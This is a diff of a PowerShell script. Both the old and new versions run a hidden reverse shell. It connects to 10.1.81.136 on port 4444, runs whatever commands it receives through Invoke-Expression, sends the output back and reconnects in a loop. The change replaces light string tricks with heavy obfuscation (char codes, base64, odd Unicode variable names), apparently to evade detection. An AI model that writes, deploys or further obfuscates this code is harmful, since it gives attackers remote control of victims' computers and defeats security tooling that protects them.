@@ -1,52 +1,43 @@
-$b4d7f = [char[]]@(83,116,97,114,116,45,80,114,111,99,101,115,115) -join ''
-& $b4d7f $PSHOME\powershell.exe -ArgumentList {
-  [string]$v1 = 'New-Object'
-  [string]$v2 = 'Net.Sockets.TCPClient'
-  [string]$v3 = 'GetStream'
-  [string]$v4 = 'IO.StreamWriter'
-  [string]$v5 = 'byte[]'
-  [string]$v6 = 'ReceiveBufferSize'
-  [string]$v7 = 'Write'
-  [string]$v8 = 'Flush'
-  [string]$v9 = 'Read'
-  [string]$v10 = 'text.encoding'
-  [string]$v11 = 'UTF8'
-  [string]$v12 = 'GetString'
-  [string]$v13 = 'Invoke-Expression'
-  [string]$v14 = 'Out-String'
-  [string]$v15 = 'Close'
-  [string]$v16 = 'Start-Sleep'
-  [string]$v17 = 'Seconds'
-  
-  while ($true) {
+$ｖ1 = [char](83)+[char](116)+[char](97)+[char](114)+[char](116)+[char](45)+[char](80)+[char](114)+[char](111)+[char](99)+[char](101)+[char](115)+[char](115)
+$ｖ2 = [System.Text.Encoding]::ASCII.GetString(@(78,101,119,45,79,98,106,101,99,116))
+$ｖ3 = [string]::Join('',@('N','e','t','.','S','o','c','k','e','t','s','.','T','C','P','C','l','i','e','n','t'))
+$ｖ4 = [regex]::Replace('IOStreamWriter','(Stream)','.$1')
+$ｖ5 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('byte[]')) -replace '.{4}$'
+$ｖ6 = [string][char]82+[char]101+[char]99+[char]101+[char]105+[char]118+[char]101+[char]66+[char]117+[char]102+[char]102+[char]101+[char]114+[char]83+[char]105+[char]122+[char]101
+
+& ([scriptblock]::Create($ｖ1)) $PSHOME\powershell.exe -ArgumentList ([scriptblock]::Create(
+@"
+  `$`{`} = @(); `$`{`} += '10.1.81.136'; `$`{`} += 4444;
+  while (`$`(```````$true```````)) {
     try {
-      $a = & ([scriptblock]::Create($v1)) ($v2 -replace '_','')('10.1.81.136',4444)
-      $b = $a.$($v3 -creplace '[a-z]','')()
-      $c = & ([scriptblock]::Create($v1)) ($v4 -join '')($b)
-      [byte[]]$d = 0..$a.$($v6 -replace 'BufferSize','') | % {0}
+      `$`_`_`_`_1 = & (`$executioncontext.InvokeCommand.NewScriptBlock(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('TgBlAHcALQBPAGIAagBlAGMAdAA='))))) (`$([char]78+[char]101+[char]116+[char]46+[char]83+[char]111+[char]99+[char]107+[char]101+[char]116+[char]115+[char]46+[char]84+[char]67+[char]80+[char]67+[char]108+[char]105+[char]101+[char]110+[char]116)) (`$`{`}[0], `$`{`}[1]);
+      `$`_`_`_`_2 = `$`_`_`_`_1.(([System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::StringToHGlobalAuto('R2V0U3RyZWFt'))))();
+      `$`_`_`_`_3 = & ([scriptblock]::Create([System.Text.Encoding]::ASCII.GetString(@(78,101,119,45,79,98,106,101,99,116)))) ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('SQBPAC4AUwB0AHIAZQBhAG0AVwByAGkAdABlAHIA'))) (`$`_`_`_`_2);
+      [byte[]]`$`_`_`_`_4 = 0..`$`_`_`_`_1.(([char]82+[char]101+[char]99+[char]101+[char]105+[char]118+[char]101+[char]66+[char]117+[char]102+[char]102+[char]101+[char]114+[char]83+[char]105+[char]122+[char]101)) | % {0};
 
-      function f ($e) {
-        $c.$($v7 -replace '^W','')($e)
-        $c.$($v8 -replace '^F','')()
+      function `$`_`_`_`_5 (`$`_`_`_`_6) {
+        `$`_`_`_`_3.(([System.Runtime.InteropServices.Marshal]::PtrToStringAnsi([System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi('V3JpdGU='))))(`$`_`_`_`_6);
+        `$`_`_`_`_3.(([char]70+[char]108+[char]117+[char]115+[char]104))();
       }
 
-      f ('')
+      `$`_`_`_`_5 (([string]::Empty));
 
-      while (($g = $b.$($v9 -replace '^R','')($d, 0, $d.Length)) -gt 0) {
-        $h = ([text.encoding]::UTF8).$($v12 -replace 'Get','')($d, 0, $g - 1)
-        $i = try {
-          & ([scriptblock]::Create($v13)) $h 2>&1 | & ([scriptblock]::Create($v14))
+      while ((`$`_`_`_`_7 = `$`_`_`_`_2.(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UmVhZA=='))))(`$`_`_`_`_4, 0, `$`_`_`_`_4.Length)) -gt 0) {
+        `$`_`_`_`_8 = (([type](([char]116+[char]101+[char]120+[char]116+[char]46+[char]101+[char]110+[char]99+[char]111+[char]100+[char]105+[char]110+[char]103))]::UTF8)).(([System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::StringToHGlobalAuto('R2V0U3RyaW5n'))))(`$`_`_`_`_4, 0, `$`_`_`_`_7 - 1);
+        `$`_`_`_`_9 = try {
+          & (`$executioncontext.InvokeCommand.NewScriptBlock([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('SW52b2tlLUV4cHJlc3Npb24=')))) `$`_`_`_`_8 2>&1 | & ([scriptblock]::Create([System.Text.Encoding]::ASCII.GetString(@(79,117,116,45,83,116,114,105,110,103))));
         } catch {
-          $_ | & ([scriptblock]::Create($v14))
+          `$_ | & ([scriptblock]::Create([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('T3V0LVN0cmluZw=='))));
         }
-        f ($i)
+        `$`_`_`_`_5 (`$`_`_`_`_9);
       }
 
-      $c.$($v15 -replace '^C','')()
-      $a.$($v15 -replace '^C','')()
+      `$`_`_`_`_3.(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Q2xvc2U='))))();
+      `$`_`_`_`_1.(([char]67+[char]108+[char]111+[char]115+[char]101))();
     }
     catch {
-      $v16 -split '-' | % { if ($_ -eq 'Sleep') { & $_ -$v17 10 } }
+      & ([scriptblock]::Create([System.Text.Encoding]::ASCII.GetString(@(83,116,97,114,116,45,83,108,101,101,112)))) -([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('U2Vjb25kcw=='))) 10;
     }
   }
-} -WindowStyle Hidden
+"@
+)) -WindowStyle Hidden
